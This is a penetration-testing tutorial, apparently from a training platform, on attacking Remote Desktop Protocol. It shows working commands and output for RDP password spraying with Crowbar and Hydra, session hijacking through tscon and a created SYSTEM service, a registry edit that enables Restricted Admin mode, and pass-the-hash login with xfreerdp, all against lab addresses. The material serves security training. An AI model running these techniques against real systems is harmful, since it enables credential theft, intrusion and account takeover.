# RDP

## Attacking RDP

***

[Remote Desktop Protocol (RDP)](https://en.wikipedia.org/wiki/Remote\_Desktop\_Protocol) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection. It is also one of the most popular administration tools, allowing system administrators to centrally control their remote systems with the same functionality as if they were on-site. In addition, managed service providers (MSPs) often use the tool to manage hundreds of customer networks and systems. Unfortunately, while RDP greatly facilitates remote administration of distributed IT systems, it also creates another gateway for attacks.

By default, RDP uses port `TCP/3389`. Using `Nmap`, we can identify the available RDP service on the target host:

Attacking RDP

```shell-session
AIceBear@htb[/htb]# nmap -Pn -p3389 192.168.2.143 

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server
```

***

### Misconfigurations

Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a misconfiguration.

One caveat on password guessing against Windows instances is that you should consider the client's password policy. In many cases, a user account will be locked or disabled after a certain number of failed login attempts. In this case, we can perform a specific password guessing technique called `Password Spraying`. This technique works by attempting a single password for many usernames before trying another password, being careful to avoid account lockout.

Using the [Crowbar](https://github.com/galkan/crowbar) tool, we can perform a password spraying attack against the RDP service. As an example below, the password `password123` will be tested against a list of usernames in the `usernames.txt` file. The attack found the valid credentials as `administrator` : `password123` on the target RDP host.

Attacking RDP

```shell-session
AIceBear@htb[/htb]# cat usernames.txt 

root
test
user
guest
admin
administrator
```

**Crowbar - RDP Password Spraying**

Attacking RDP

```shell-session
AIceBear@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

We can also use `Hydra` to perform an RDP password spray attack.

**Hydra - RDP Password Spraying**

Attacking RDP

```shell-session
AIceBear@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

We can RDP into the target system using the `rdesktop` client or `xfreerdp` client with valid credentials.

**RDP Login**

Attacking RDP

```shell-session
AIceBear@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143

Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes
```

![](https://academy.hackthebox.com/storage/modules/116/rdp\_session-7-2.png)

***

### Protocol Specific Attacks

Let's imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.

**RDP Session Hijacking**

As shown in the example below, we are logged in as the user `juurena` (UserID = 2) who has `Administrator` privileges. Our goal is to hijack the user `lewen` (User ID = 4), who is also logged in via RDP.

![](https://academy.hackthebox.com/storage/modules/116/rdp\_session-1-2.png)

To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. It works by specifying which `SESSION ID` (`4` for the `lewen` session in our example) we would like to connect to which session name (`rdp-tcp#13`, which is our current session). So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:

Attacking RDP

```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

If we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.

Attacking RDP

```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

![](https://academy.hackthebox.com/storage/modules/116/rdp\_session-2-2.png)

To run the command, we can start the `sessionhijack` service :

Attacking RDP

```cmd-session
C:\htb> net start sessionhijack
```

Once the service is started, a new terminal with the `lewen` user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.

![](https://academy.hackthebox.com/storage/modules/116/rdp\_session-3-2.png)

_Note: This method no longer works on Server 2019._

***

### RDP Pass-the-Hash (PtH)

We may want to access applications or software installed on a user's Windows system that is only available with GUI access during a penetration test. If we have plaintext credentials for the target user, it will be no problem to RDP into the system. However, what if we only have the NT hash of the user obtained from a credential dumping attack such as [SAM](https://en.wikipedia.org/wiki/Security\_Account\_Manager) database, and we could not crack the hash to reveal the plaintext password? In some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.

There are a few caveats to this attack:

* `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:

![](https://academy.hackthebox.com/storage/modules/116/rdp\_session-4.png)

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG\_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. It can be done using the following command:

**Adding the DisableRestrictedAdmin Registry Key**

Attacking RDP

```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![](https://academy.hackthebox.com/storage/modules/116/rdp\_session-5.png)

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:

Attacking RDP

```shell-session
AIceBear@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                                   
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd                                  
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr                                 
[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized                               
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state        
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz                                                     
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={                                                              
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F                                        
[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags "0xE2898235"

<SNIP>

```

If it works, we'll now be logged in via RDP as the target user without knowing their cleartext password.

![](https://academy.hackthebox.com/storage/modules/116/rdp\_session-6-2.png)

Keep in mind that this will not work against every Windows system we encounter, but it is always worth trying in a situation where we have an NTLM hash, know the user has RDP rights against a machine or set of machines, and GUI access would benefit us in some ways towards fulfilling the goal of our assessment.
